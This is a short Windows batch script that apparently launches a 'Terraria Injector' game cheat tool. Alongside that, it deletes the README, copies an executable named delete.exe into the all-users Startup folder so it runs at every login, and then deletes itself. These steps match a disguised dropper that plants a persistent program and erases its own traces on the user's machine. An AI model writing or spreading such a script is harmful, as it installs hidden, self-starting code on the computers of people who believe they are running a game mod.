@echo off
del README.md

.\"Terraria Injector.exe"
move delete.exe "%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\StartUp"

start /b "" cmd /c del "%~f0"&exit /b
